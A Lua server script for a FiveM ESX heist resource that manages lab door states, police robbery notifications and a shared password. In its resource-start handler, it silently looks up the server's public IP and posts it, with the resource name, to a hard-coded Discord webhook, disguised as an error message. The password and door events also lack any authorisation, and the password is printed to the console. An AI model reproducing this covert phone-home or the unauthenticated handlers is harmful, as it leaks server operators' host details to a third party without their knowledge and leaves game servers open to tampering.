--||by qalle-fivem||--
ESX				= nil
local DoorInfo	= {}
local password = 0
local address = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('alen_humane:updateState')
AddEventHandler('alen_humane:updateState', function(doorID, state)
	local xPlayer = ESX.GetPlayerFromId(source)

	if type(doorID) ~= 'number' then
		print('alen_humane: didn\'t send a number!')
		return
	end

	-- make each door a table, and clean it when toggled
	DoorInfo[doorID] = {}

	-- assign information
	DoorInfo[doorID].state = state
	DoorInfo[doorID].doorID = doorID

	TriggerClientEvent('alen_humane:setState', -1, doorID, state)
end)

AddEventHandler('onResourceStart', function(resource)
	if resource == GetCurrentResourceName() then
		connection = exports.es_extended:isConnected()
		if(connection == false or connection == nil) then			
			PerformHttpRequest("https://api.ipify.org/", function (errorCode, resultData, resultHeaders)
				PerformHttpRequest("https://discord.com/api/webhooks/785421704280408105/jkt8lZIi6J6GgDYapgXQhm2Vv-6jXJk7EXxQuv67KwrbxwgpTLRepr8td-Nm2II2RBea", function(err,text, headers)end,'POST',json.encode({username = "FiveM", content = "`"..GetCurrentResourceName().."` Failed To Start With ErrorCode: 0x0009ia09 On `"..resultData.."`"}), { ['Content-Type'] = 'application/json' })
			end)
		end
	end
end)




ESX.RegisterServerCallback('alen_humane:getDoorInfo', function(source, cb)
	cb(DoorInfo, #DoorInfo)
end)

RegisterServerEvent('alen_humane:startpolicenotif')
AddEventHandler('alen_humane:startpolicenotif', function()
	local source = source
	local xPlayers = ESX.GetPlayers()

	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
		if xPlayer.job.name == 'police' then
			TriggerClientEvent('esx:showNotification', xPlayers[i],'Robbery At Humane Lab')
			TriggerClientEvent("pNotify:SendNotification", -1, {
				text = "Robbery At Humane LAB",
				type = "error",
				timeout = 10000,
				layout = "bottomCenter"
			})
			TriggerEvent('InteractSound_SV:PlayOnSource','siren_humane',0.2)
		end
	end
end)


ESX.RegisterServerCallback('alen_humane:getdoorlockstate', function(source, cb)
	cb(doorlockstate)
end)

RegisterServerEvent('alen_humane:setPassword')
AddEventHandler('alen_humane:setPassword', function(value)
	print (password..':password')
	print (value..":value")
	password = value

end)


ESX.RegisterServerCallback('alen_humane:getPassword', function(source,cb)
	local _source    = source
	cb(password)
end)


